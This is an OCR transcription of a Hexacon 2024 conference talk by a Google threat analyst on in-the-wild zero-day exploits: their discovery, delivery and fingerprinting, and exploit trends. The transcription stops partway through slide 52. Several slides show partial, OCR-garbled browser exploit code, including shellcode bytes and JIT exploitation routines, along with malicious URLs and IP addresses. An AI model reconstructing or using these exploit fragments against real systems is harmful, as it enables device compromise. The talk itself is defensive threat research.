---
title: "Caught in the wild, past, present and future"
speakers: ["Clem1"]
conference: "Hexacon"
conference_full: "Hexacon 2024"
edition: ""
year: 2024
source_pdf: "Hexacon 2024 Slides/Clem1_Caught in the wild, past, present and future.pdf"
pages: 64
sha256: "ebc406f476ab0ee411cb9b9999008c3ae87e6d59f9e3f61cd9f4b70accca396a"
text_chars: 26889
ocr_pages: 37
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.7
ocr_unreliable_blocks: 4
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:49:41Z"
---
# Caught in the wild, past, present and future

**Speakers:** Clem1  
**Conference:** Hexacon 2024  
**Source:** `Hexacon 2024 Slides/Clem1_Caught in the wild, past, present and future.pdf` (64 pages)


## Slide 1

Caught in the wild
Past, present and future
Clement Lecigne - Hexacon 2024

Threat Analysis Group

1


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Caught in the wild
Past, present and future
Clement Lecigne - Hexacon 2024
9 Threat Analysis Group
Google ,
```

## Slide 2

# Who am I

_Tiny little exploit hunter within Google Threat Analysis Group ▄_ ︻デ _══_ ━一

2

## Slide 3

3


> Recovered by OCR — confidence 92/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Official Blog
Go e Insights from Googlers into our products,
technology, and the Google culture
A new approach to China
January 12, 2010
Like many other well-known organizations, we face cyber attacks of varying degrees on
a regular basis. In mid-December, we detected a highly sophisticated and targeted
attack on our corporate infrastructure originating from Chin= * -* ==~-"t= 4 i= shah
intellectual property from Google. However, it soon became CVE-2010-0249
different.
Information CPEs Plugins
Description
Use-after-free vulnerability in Microsoft Internet Explorer 6, 6 SP1, 7, and 8 on Windows 2000 SP4; Windows
XP SP2 and SP3; Windows Server 2003 SP2; Windows Vista Gold, SP1, and SP2; Windows Server 2008 Gold,
SP2, and R2; and Windows 7 allows remote attackers to execute arbitrary code by accessing a pointer
associated with a deleted object, related to incorrectly initialized memory and improper handling of objects
in memory, as exploited in the December 2009 and January 2010 di Operation Aurora,jaka "HTML
Object Memory Corruption Vulnerability.”
3
```

## Slide 4

Why am I here _~~Who invited this guy?~~ Why did I say yes?_

4

## Slide 5

5


> Recovered by OCR — confidence 96/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BTW the whole world wants to know how
Google has telemetry in the wild to find iOS
4:04 PM - 23 Feb 2019
They have back doors in everything and read all the emails.... how do you figure
the Odays are using Google Analytics
The group that coordinated their campaign over Hangouts? ;)
```

## Slide 6

Ethics
Just one slide, I promise you

6

## Slide 7

_From a thread on mastodon_

7


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
does all it can to prevent misuse, to the point of trigger
happy blacklisting (and strict whitelisting!). We'd rather lose
money than be part of human rights violations, and Amnesty and
other defense players are encouraged to reach out to us if they
have any information leading them to believe our products are
being misused. We do not take misuse lightly.
Pisses me off to be lumped in with companies developing actual spyware
and who generally DGAF about externalities involved. We are a pure play
tesearch shop, develop no agents or spyware, and place all our customers
under very strict restrictions. It's not perfect, and mistakes have
happened, which is why we appreciate the work groups like Google TAG
and Citizen Lab do and really wish for defense to actually talk with us
rather than just slander the work we do comparing us to shady AF players.
From a thread on mastodon
```

## Slide 8

# Plan for today

● ~~Overview of the 0-day industry~~

● Discovery

● Delivery

● Exploits

● Post exploitation

● Future

8

## Slide 9

Discovery How are exploits discovered? Secret

9

## Slide 10

# Watering hole

10

## Slide 11

Motivations

11


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
FireEye discovered a new watering hole attack
based on 0-day exploit
on February 20, 201 News
11:00 ET, 20 February 2014
Security researchers from FireEye have recently discovered a new IE 10 Zero-Day
exploit being used in a watering hole attack.
INCIDENTS
New Flash Player 0-day (CVE-2014-
0515) Used in Watering-hole Attacks
By Vyacheslav Zakorzhevsky on April 28, 2014. 12:35 am
In mid-April we detected two new SWF exploits. After some detailed analysis it was clear they didn’t use any of the
vulnerabilities that we already knew about. We sent the exploits off to Adobe and a few days later got confirmation
that they did indeed use a 0-day vulnerability that was later labeled as CVE-2014-0515. The vulnerability is located in the
Pixel Bender component, designed for video and image processing.
11
```

## Slide 12

## **T-1**

12


> Recovered by OCR — confidence 87/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
http://dprkmedia.com/
http://dprkmedia.com/js/admin.js
http://dprkmedia.com/js/main.js
http://dprkmedia.com/css/main.css
http://dprkmedia.com/js/google_map.js
http://dprkmedia.com/images/logo_main.gif
http://dprkmedia.com/images/banner_kpm.gif
http://dprkmedia.com/images/bar_left_rodong.gif
http://dprkmedia.com/images/bar_left_minju.gif
http://dprkmedia.com/images/bar_left_munhak.gif
http://dprkmedia.com/images/bar_left_news.gif
http://dprkmedia.com/images/bar_left_journal.gif
http://dprkmedia.com/images/bar_left_information.gif T- 1
http://dprkmedia.com/images/btn_main_more2.gif
http://dprkmedia.com/images/icon_photo.gif
http://dprkmedia.com/images/line_main.gif
http://dprkmedia.com/images/btn_main_more.gif
http://dprkmedia.com/images/bg_search_top.gif
http://dprkmedia.com/images/btn_search_big.gif
http://dprkmedia.com/images/bg_search_bottom.gif
http://dprkmedia.com/images/bar_r_photo.gif
http://www.dprkmedia.com/images/rodong_title.jpg
http://www.dprkmedia.com/images/minju_title.jpg
http://www.dprkmedia.com/images/munhak_title.jpg
http:/Avww.google-analytics.com/r/collect?v=1&_v:
12
```

## Slide 13

## **T-0**

13


> Recovered by OCR — confidence 85/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
URI (click to show headers)
http://dprkmedia.com/
http://dprkmedia.com/js/main.js
http://dprkmedia.com/js/google_map.js
http://dprkmedia.com/images/logo_main.gif
http://dprkmedia.com/images/banner_kpm.gif
http://dprkmedia.com/css/main.css
http://dprkmedia.com/images/bar_left_rodong.gif
http://dprkmedia.com/images/btn_search_big.gif
http://dprkmedia.com/images/bg_search_bottom.gif
http://dprkmedia.com/images/bar_r_photo.gif
8 http//www.google- analytics. com/analytics. is
http://dprkmedia.com/Uploaded/ImageCenter/Thumb/KMP_T13170.jpg
http://dprkmedia.com/images/bar_r_editorial.gif
http://dprkmedia.com/images/bar_r_interview.gif
http://dprkmedia.com/images/bar_r_kigo.gif
http://luckluck.blog/brale/
13
```

## Slide 14

14


> Recovered by OCR — confidence 76/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
——— infected
http://www.akademiye.org/ug/wp-content/themes/goodnews/images/up.png
® i 82.61.171.1 67:9321/u84VF2XBgZwM a
14
safari/webkit exploit
sandbox escape
```

## Slide 15

15


> Recovered by OCR — confidence 77/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
x9
X9, #alohidcreatebin@PAGE ; "_I0HIDCreateBinaryData"
X1, X9, #alohidcreatebingPAGEOFF ; "_IOHIDCreateBinaryData"
X9, X9, #asc_1010@@Q10@PAGEOFF ; "\"\"\"\"\"\"\"\"" @ ) xrefs to io_hideventsystem_open_ptr
X30, X3@, #qword_101@23CE@@PAGEOFF Direction Tyr Address Text
xs [}D... 0 resolve_apis+934 ADD X30, X30, #io_hideventsystem_open_ptr@PAGEOFF
X1, X9, #aIoHideventsyst@PAGEOFF ; "io_hideventsystem_open" _
X30, #io_hideventsystem_open_ptr@PAGE
X3@, X3@, #io_hideventsystem_open_ptr@PAGEOFF Help Search Cancel (CD
X@, X8
x9
X8, #0xFFFFFFFFFFFFFFFE
X9, #aKcftypearraycagPAGE ; "kCFTypeArrayCallBacks"
X1, X9, #aKcftypearraycagPAGEOFF ; "kCFTypeArrayCallBacks"
X30, #qword_101023CF@@PAGE io_hideventsystem_open exploit §$Q
X30, X30, #qword_101023CF@@PAGEOFF
X@, [X30]
co x8 QaAl ©) Videos E) Images News (Maps : More Settings Tools
X8, #OxFFFFFFFFFFFFFFFE
X9, #akcftypedictiongPAGE ; "kCFTypeDictionaryKeyCallBacks"
X1, X9, #aKcftypediction@PAGEOFF ; "kCFTypeDictionaryKeyCallBacks" a About 6 results (0.27 seconds)
X9, X9, #asc_1010@@010@PAGEOFF ; "\"\"\"\"\"\"\"\""
X30, #qword_101023F18@PAGE macOS < 10.14.3 / iOS < 12.1.3 - Sandbox Escapes Exploit Database
X30, X30, #qword_101023F18@PAGEOFF https:/ e b.com/exploits/46298 ¥
Jan 31, 2019]] CVE-2019-6214 os exploit for Multiple platform. ... io_hideventsystem_open expect
to be called on a "connection" port, but that's not enforced ...
15
```

## Slide 16

😈

16


> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
This project aims at delivering brows AG oits to the victim browser in an encrypted fashion. Ellyptic-curve Diffie-
Hellman (secp256k1) is used for key. {1 ement and AES is used for encryption.
By delivering the exploit code (and shellcode) to the victim in an encrypted way, the attack can not be replayed.
Meanwhile the HTML/JS source is encrypted thus reverse engineering the exploit is significantly harder.
16
```

## Slide 17

# Typosquatting

17

## Slide 18

Same iOS exploit chains on tibct.net

18


> Recovered by OCR — confidence 77/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
http:/
——— infected
www.akademiye.org
ug/wp-content/themes/goodnews/framework/scripts/timt...
®& http:
182.61.171.167:9321/u84VF2XBgZwM }«—————__ safari/webkit exploit
® http: 182.61.171.167:9321/hvAB2wATs431 («—_—_————.__ sandbox escape
[Same iOS exploit chains on tibct.net |
18
```

## Slide 19

# Detection

19

## Slide 20

20


> Recovered by OCR — confidence 86/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
3 function version_is_supported() {
4 var e = window. navigator.userAgent;
5 return -1 == e.search("Macintosh") && "12_2" == new RegExp("0S ([\\d._]+)", "gi").exec(e) [1]
=
gc = function() {
for (var e = 0; e < 256; e++) gccachele] = new Uint32Array(65536).fill(1)
al
};
12 function u2d(e, t) {
13) return _dview.setUint32(0, e), _dview.setUint32(4, t), _dview.getFloat64(0)
14}
15,
16) function d2u(e) {
17 return _dview.setFloat64(0, e), Uint64(_dview.getUint32(@), _dview.getUint32(4) )
19 =
20 function exp(e) {
21 let t = new Date,
22 r = new Array(13.37, 13.37);
25
27 alo];
28 let i=5 ine;
29 return t(0] = t[1] = afi], r{2] += 32, afi] = t{1], i
30 iP
31 Date.prototype.__proto__ = new Proxy(Date.prototype.__proto_, {
32 has: function() {
36 let n = new Uint32Array(4),
38 for (let e = 0; e < 5e4; e++) i(t, d, n, r);
39 a=1;
40 i(t, d, n, 1);
20
```

## Slide 21

CVE-2022-0609

21


> Recovered by OCR — confidence 83/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
th
va
va
va
va
//
va
va
va
//
va
va
va
RCE result
r rce_result_state = null;
r rce_result_length = null;
r rce_result_buffer = null;
r rce_result_string = null;
Fetch object
r fetch_header = null;
r fetch_request = null;
r fetch_response = null;
RCE shellcode
r shellcode_u8a = null;
r shellcode_view = null;
SBX shellcode
r sbx_shellcode = null;
fui
inction get_version() {
21 let pieces = navigator.appVersion.match(/Chrome\/( [0-9]+)\. ( [0-9]+)\. ( [0-9]+)\. ( [0-9]+)/);
22 if (pieces == null || pieces.length != 5) {
23 return 0;
24 }
25
26 return parseInt(pieces[1]);
7}
piel
(30 function gc(){
31 = for(var i = O;i < ((1024%1024)); i++) {
32 var a = new String();
33) }
\34 }
37 var rce_shellcode = [
38 @xE9, @x8B, Ox@D, Ox@0, @x@@, OxCC, OxCC, OxCC, Ox48, Ox89, Ox5C, Ox24, 0x18, @x55, x56, 0x57,
4
42 code_u8a = new Uint8Array(rce_shellcode) ;
43 code_view = new DataView(code_u8a. buffer);
co
CVE-2022-0609
```

## Slide 22

One-time links

22

## Slide 23

23


> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
How long are the NATO members going to let Turkey and Hungary to
mock the alliance ? The longer the blockade of Finland and Sweden
takes, the weaker the alliance looks.
Joseph Go 46» Marta - Téi ing hé Ukraine tan cong
e Replying to} vao cac khu quan su cla nga
NATO is a stupid organization, Turkey is doing the right thing ngé nham giam bét tén that 6
Like © Comment
Most relevant ~
mong chién su mau cham dit
BAOTIENGDAN.COM
Tinh hinh Ukraine ngay th 376 |
Tiéng Dan
23
```

## Slide 24

# Crashes

24


> Recovered by OCR — confidence 87/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Crashes \\j @
x x
Aw, Snap!
Something went wrong while displaying this webpage.
24
```

## Slide 25

25


> Recovered by OCR — confidence 80/100 on the text kept, 79/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Thread 15 (id: 0x00005df0) CRASHED [ EXCEPTION_INVALID_ HANDLE @ 0x00007fffcabdfefa ] MAGIC SIGNATURE THREAD
Stack Quality 75% Show frame trust levels
S Context 0x00007fffcabdfefa ( ntdil.dil + Ox0009fefa ) KiRaiseUserExceptionDispatcher
CFI 0x00007ff6ae02d7c0 ( chrome.exe - interceptors_64.cc: 60 ) sandbox::TargetNtSetinformationThread64
S CFI 0x00007fffc8805ae3 ( KERNELBASE.dll + 0x00065ae3 ) SetThreadPriority
CFI 0x0000021a5a9d27ca
S Scan O0x00007fffc§e7bd3 ( KERNEL32.DLL + 0x00017bd3 BaseThreadinitThunk
S CFI connie ( ntdll.dil + Ox0006cee0 ) RtlUserThreadStart
25
```

## Slide 26

26


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Thread 12 (id: 0x000063ae) CRASHED MAGIC SIGNATURE THREAD 1D
© Exception info SIGSEGV /0x00000000 @ 0x7f7563fd @
Stack Quality 89% Show frame trust levels @
0x0000007f71715ff4 ( libchrome.so - atomicops_internals_arm64_gcc.h: 293 ) v8::External::Value
0x0000007f723295be ( libchrome.so - WrapperTypelnfo.h: 97 ) blink::failedAccessCheckCallbackInMainThread
0x0000007f71852c70 ( libchrome.so - heap.h: 1339 ) v8::internal::Heap::ScavengeObjectSlow
0x0000007f7185b408 ( libchrome.so - heap.cc: 4955 ) v8::internal::Heap::lterateAndMarkPointers ToFromSpace
0x0000007f7185b844 ( libchrome.so - heap.cc: 1940 )
0x0000007f7185ca20 ( libchrome.so - heap.cc: 1607 )
0x0000007f7185dffc ( libchrome.so - heap.cc: 1174 )
0x0000007f7185f284 ( libchrome.so - heap.cc: 900 )
v8::internal::Heap::DoScavenge
v8::internal::Heap::Scavenge
v8::internal::Heap::PerformGarbageCollection
0x0000007f7181dee0 ( libchrome.so - heap-inl.h: 569 ) v8:.internal::Factory:: NewUninitializedF ixedArray
0x0000007f717476f4 ( libchrome.so - builtins.cc: 332 ) v8::internal::Builtin_ArrayPush
0x0000007f50607fbO
26
```

## Slide 27

27


> Recovered by OCR — confidence 89/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Pwnie Awards @PwnieAwards - Aug 10, 2022 eee
Another fan favorite: = %=: "2; The Lamest Vendor Award! Presented to the
vendor who mis-handled a security vulnerability most spectacularly.
Pwnie Awards eee
@PwnieAwards
Our final nomination for Lamest Vendor Response goes to:
Google TAG for “unilaterally shutting down a counterterrorism
operation”.
9:32 AM - Aug 10, 2022
27
```

## Slide 28

**<u>Entry point</u>** <u>: 2 suspicious crashes from reernaimage[.]com -  ¯\_(ツ)_/¯</u>

<u>SafeBrowsing:</u> Automatic crawling noticed iframe loaded from obedientsupporters[.]com

28

## Slide 29

reernaimage[.]com

29


> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
———_» reernaimage[.]com
Password
ANY.RUN
https://any.run » report
Malware analysis https://obedientsupporters.com/owncloud
Nov 26, 2019 — stats.obedientsupporters.com. 104.24.116.231; 104.24.117.231.
Threats. No threats detected. Debug output strings. Add for printing. No ...
www.bing.com 204.79.197.200
13.107.21.200
rr ad stats.obedientsupporters.com 104.24.116.231
104.24.117.231
29
```

## Slide 30

30


> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Log in to EZ2Share Files
Account name or email
Password
( 2)
Forgot password?
Log in with a device
```

## Slide 31

# Public repositories

31

## Slide 32

32


> Recovered by OCR — confidence 88/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
6666/UNKNOWN
X12, #0x18C0
Banner (Hex),
X1, [SP,#0x18CO+var_18A0]
X2, [SP,#0x18CO+var_18A8]
X@, loc_2960 ; char *
logmsg
xo,] aStaringSoloade ;§"staring soloader payload"
logmsg
; CODE XREF: sub_8510+C,j
XO, XO, #0xFFFFFFFFFFFFFOOO
x3, XO
XO, elf_payload
UNG | MOBILE DEVICES , XO, #0xFFFFFFFFFFFFFOOO
sub_0
sung Mobile Devices Race Condition Vulnerability: Samsung mobile devices contain a race condition vulnerability within
IFC charger driver that leads to a use-after-free allowing for a write given a radio privilege is compromised. 3 ——
elf_payload
vn To Be Used in Ransomware Campaigns? Unknown
yn: Apply updates per vendor instructions or = Date Added: 2023-06-29
_ use of the product if updates are = Due Date: 2023-07-20
ailable
32
```

## Slide 33

# Discovery

Many more but no

Delivery

aka what’s happening before the exploits

33

## Slide 34

Server side fingerprinting

34

## Slide 35

35


> Recovered by OCR — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
HTTP/2 Fingerprinting
Your Web Browser :
HTTP User-Agent Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0
Safari/537.36
HTTP/2 Support Detection :
HTTP Protocol wv HTTP/2
HTTP/2 Fingerprint
Akamai Hash 52D84B11737D98@AEF856699F885CA86
Akamai Text 1:65536;2:0;4:6291456;6:262144|15663105|0|m,a,s,p
@ SSUTLs Client Test SETTINGS Frame:
Length 24
Check your browser's supported TLS protocols, cipher suites, tas SETTINGS_HEADER-TABLE_SIZE: 65536
TLS extensions, and key exchange groups. Identify weak or SETTINGaTIaTRWNCGMTSIE CoSIACE
insecure options, generate a JA3 TLS fingerprint, and test how SETTINGS_MAX_HEADER_LIST_SIZE: 262144
the browser handles insecure mixed content.
Your Web Browser
HTTP User-Agent —_Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0
Safari/537.36
More Tools Protocol Support:
Here is a list of new, experimental, controversial, broken, and deprecate Tae EECA
= HTTP/2 Fingerprinting — reading HTTP/2 frames and creating an impr ein nesner Cee
Mixed Content Test :
Active Content v Blocked
Passive Content v Upgraded to HTTPS.
TLS Fingerprint
‘JA3 Hash 2CC2AC2BBB3327F6EB799DA3C2285531 | Expand
JA3n Hash 4C9CE26@28C11D7544DA@@D3F7E4F45C
Handshake : d
TLS Protocol TLS 1.3 [HTTP/2]
Cipher Suite @x1301 TLS_AES_128_GCM_SHA256 Recommended
Supported Cipher Suites (in order as received)
Cipher Suites @x4A4A GREASE
```

## Slide 36

Client side fingerprinting Javascript WebGL

36

## Slide 37

37


> Recovered by OCR — confidence 91/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
What is User-Agent reduction? 1 - Send feedback
User-Agent (UA) reduction minimizes the identifying information shared in the |
fingerprinting. Now that these changes have been rolled out for general availab
header. As a result, the return values from certain Navigator interfaces are re
User-Agent Client Hints API
A Experimental: This is an experimental technology
The User-Agent Client Hints API extends Client Hints to provide a way of exposing browser and
platform information via User-Agent response and request headers, and a JavaScript API.
accept-ch ec-CH-UA-Arch, Sec-CH-UA-Bitness, Sec-CH-UA-Full-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Platform
sec-ch-ua:
sec-ch-ua-mobile:
sec-ch-ua-full-version:
sec-ch-ua-arch:
?1
sec-ch-ua-platform: "Android"
sec-ch-ua-platform-version: "14.0.0"
sec-ch-ua-model: "SM-G991B"
sec-ch-ua-bitness: _
sec-ch-ua-wow64: 70
sec-ch-ua-full-version-list: "Not)A;Brand";v="99.0.0.0", "Google Chrome"; v="127.0.6533.103", "Chromium"; v="127.0.6533.103"
37
```

## Slide 38

38


> Recovered by OCR — confidence 84/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
> navigator.platform
< ‘Linux armv81'
> navigator. Language
> const canvas = document.createElement('canvas');
const gl = canvas.getContext('webgl');
console. log(gl.getParameter(gl.SHADING_LANGUAGE_VERSION) );
WebGL GLSL ES 1. (OpenGL ES GLSL ES 1.@ Chromium)
WebKit
38
```

## Slide 39

# Exploits

Kernel
Sandbox
protection
Renderer
PrivEsc
PAC/V8 heap sandbox
#
39

## Slide 40

Trends in browser RCE Public ~= private research

40

## Slide 41

41


> Recovered by OCR — confidence 85/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1
2
4
6
8
10
11
12
13
14
15
16
30
39
40
42
43
44
45
46
47
function x() {
var e
var t
function i() {
for (let e =
+
a.push(new ArrayBuffer(8));
function r(e, t) {
function Ue) {
let t = new Date;
let i = null;
do {
i = new Date
function s(e, t) {
new FileReader;
let
let s
isonloadstart = function() {};
i.onprogress = function(e) {
at;
if (r)_ return;
if (e.loaded != e.total) return;
try {
t(this.result, this.result);
r= true
} catch (e) {}
isonload = function() {
if (r) return;
a
this. readAsArrayBuffer(new Blob( [e]))
i. readAsArrayBuffer(new Blob([e]))
(144, 144, 100, 161, 4, 0, 0, 0, 137, 196, 144, 144, 144
e < 500; e++) new ArrayBuffer(1024 * 1024)
. const Fd = 12201;
. const jd = 12202;
. const Qd = 12203;
« const Nd = 12204;
. const Hd = 12205;
« const Gd = 12206;
+ const Yd = 12207;
. const zd = 12208;
. const Wd = 12209;
« const Jd = 12210;
. const Kd = 12211;
- const Vd = 12212;
. const Xd = 12213;
+ const Zd = 12214;
+ const $d = 12215;
function Rd(S) {
const T = 0x41;
return [T, ...Md(S, 5)];
+ const Ld = 12200;
function ei() {
const S = new Od();
const T = S.ass([
Id(td, true), Id(Ya, true), Id(za, true), Id(td,
Id(Wa, true), Id(Ja, true), Id(td, true), Id(td,
Id(za, true), Id(td, true), Id(td, true), Id(za,
Id(td, true), Id(Ka, true), Id(Ja, true), Id(za,
const Rl = S.raaa(_d(T), true);
const Ll = S.ass([
Id(td, true), Id(Ya, true), Id(za, true), Id(td,
Id(Ya, true), Id(za, true), Id(td, true), Id(td,
Id(za, true), Id(td, true), Id(td, true), Id(Ja,
Id(td, true), Id(va, true), Id(Ja, true), Id(za,
const Fl = S.raaa(_d(Ll), true);
const jl = S.ass({Id(_d(RU), true), Id(td, true)]);
const Ql = S.ass({Id(_d(Fl), true), Id(Ya, true)]);
true),
true),
true),
true),
true),
true),
true),
true),
-ftkka({hd, bd, T, hd, Sd, Rl, 1, pa, @, hd, md, jUl)
-ffkka((hd, bd, Ll, hd, Sd, Fl, 1, pa, 0, hd, md, QUI)
-ffkka((pa, 0, pa, 1, hd, Dd, jl, 1)
-ffkka([pa, ®, pa, 1, hd, Dd, Ql, 11)
const ql = new WebAssembly.Module(S.tabf());
const Nl = new WebAssembly.Instance(ql);
return Ni:
Id(td,
Id(Ya,
Id(Ja,
Id(td,
Id(td,
Id(Ya,
Id(Ja,
Id(td,
true),
true),
true),
true)
true),
true),
true),
true)
```

## Slide 42

42


> Recovered by OCR — confidence 85/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
function secondStage(){
// alert('should be ok");
// caculate slide
leak();
// find dyld_start,
var dyld_lookup =| Read64(Uint64 b_db.look)) ;
while (Read32(dyld_lookup) !=)e@xfeedfacf) {
}
var dyld_start =|dyld_lookup jadd(@x190@) ;
// alert(‘dyld sterer==rtiyid_start.toString());
// make some jit code
var fn = generateFunc();
// leak jit address and offset used by jitwritefunction
var offset = jit_info.jit_offset;
var jitaddr = jit_info.jit_addr;
// alert('jit at ' + jitaddr.toString());
function W() {
var a =! G(p( - look) );
a.lo = a.lo [saretaie
while (q(a) !=]4277009103)} {
a = a.sub(
}
var n add(4@96) ;
var e ="Jl);
var i = K(e);
var 0 = i.jit_offset;
var c = i.jit_addr;
var d = new Uint8Array(524288) ;
var f = H(d);
var u = G(f.add(16));
var v = 16384 - (c.lo & 16383);
var 1 = c.add(16384 + v);
var s = u.add(4@96) ;
var g = t.length + 16384 * 2;
var h = G(p(r.j_wr));
var. = new k(d. buffer);
42
```

## Slide 43

PAC/V8 heap “sandbox” bypasses

43

## Slide 44

_https://github.blog/security/vulnerability-research/from-object-transition-to-rce-in-the-chrome-renderer/_ 44


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Thinking outside of the heap sandbox
The recently introduced v8 heap sandbox isolates the v8 heap from other process
memory, such as executable code, and prevents memory corruptions within the v8
heap from accessing memory outside of the heap. To gain code execution, a way to
escape the heap sandbox is needed.
In Chrome, Web API objects, such as the Dom object, are implemented in Blink.
Objects in Blink are allocated outside of the v8 heap and are represented as api
objects in v8:
https://github. blog/security/vulnerability-research/from-object-transition-to-rce-in-the-chrome-renderer/
44
```

## Slide 45

# Half-day

45

## Slide 46

“Silent” intent redirect vulnerability to the rescue

46


> Recovered by OCR — confidence 84/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
"package=com. sec.android.app.sbrowser; action=android. intent.action.SBROWSER_VIEW_FOR_EXTERNAL_APP; end";
Choose activity
€ Chrome
Oo Samsung Internet
“Silent” intent redirect vulnerability to the rescue
46
```

## Slide 47

47


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bug (libhemlock.so)
The bug used was fixed in commit 77f4689de17c0887775bb77896f4cct1a39bf848 without CVE
assigned, fix was released in:
© 4.9.239
e 414.201
All currently supported pixel phones are running a kernel including the fix. OTOH it looks like all
most recent Samsung kernels are affected by this issue as the fix wasn’t backported in their
Android kernel tree. Other vendors, e.g. Huawei might be affected as well.
The bug does not require any special privileges to trigger (only using epoll, pthread and
AF_LOCAL sockets) and can be used as a sandbox escape directly from the Chrome renderer.
The syscalls can't be easily filtered from the BPF sandbox as they are used in a normal way.
47
```

## Slide 48

# Proper sandbox escape

48

## Slide 49

49


> Recovered by OCR — confidence 71/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LOAD:000017B6 aLiblogSo
DCB "Liblog.so",0
DCB "Libchopin.so
[Fi sub_s9454 int sub_594CC()
[F) sub_594A0 {
eke int result; // r@
F sub_59538 int v1; // r4
[) sub_s95ac int v2; /int result; // r0
[Fh sub_59596 char v4[16]; // [sp+4h] [bp-24h] BYREF
[F sub_s95A4 int v5; // [sp+14h] [bp-14h] BYREF
[7] sub_s9604 result = sub_AD600();
[F) sub_59620 dword_113B80 = result;
[F) sub_59670 {
Hien sees v5 = sub_59660(*(_DWORD *)(result + 556));
[ sub_59680 vl = v5;
[£) sub_s96ce sub_B167C(v4, "run_poc_thread", "../../chopin/entry.cc"
(Fi nullsub_2 v2 = sub_59698(&v3);
[F) sub_s96rc sub_C65CO(v1, v4, v2)
[F) sub_59A60 }
[F) sub_S9AA0
ine 6727 of 6727, [_i
[F) sub_9A6B8
[F) sub_9A6CO
mojo::AssociatedRemote<gpu::mojom::GpuChannel>::BindNewEndpointAn...
HintSessionFactory::Create(base::internal::flat_tree<int,st
:_Cr::ident...
-__throw_length_error(char const*)
tree_balance_after_insert<std::__Cr::__tree_node_base<void ...
[F) viz::YUVVideoDrawQuad::YUVVideoDrawQuad(void)
```

## Slide 50

# Trends in LPE

50

## Slide 51

51


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Mind the Gap
By lan Beer, Project Zero
Note: The vulnerabilities discussed in this blog post (CVE-2022-33917) are fixed by the upstream vendor, but
at the time of publication,|these fixes have not yet made it downstreaml|to affected Android devices (including
Pixel, Samsung, Xiaomi, Oppo and others). Devices with a Mali GPU are currently vulnerable.
Title Mali GPU Kernel Driver allows improper GPU memory processing operations
Bateaniscue 3rd September 2024
© Bifrost GPU Kernel Driver: All versions from r43p0 - r49p0
e Valhall GPU Kernel Driver: All versions from r43p0 - r49p0
e Arm 5th Gen GPU Architecture Kernel Driver: All versions from r43p0 - r49p0
Impact A local non-privileged user can make improper GPU memory processing operations to gain access to already freed memory.
Resolution This issue is fixed in Bifrost, Valhall and Arm 5th Gen GPU Architecture Kernel Driver r49p1 and r50p0. Users are recommen
Credit n/a
51
```

## Slide 52

CVE-2023-42824

52


> Recovered by OCR — confidence 92/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
void *__fastcall noclip::get_buggy page(noclip *this)
target_address = OLL;
if ( !vm_remap(
(vm_map_t) (unsigned int)mach_task_self_,
&target_address,
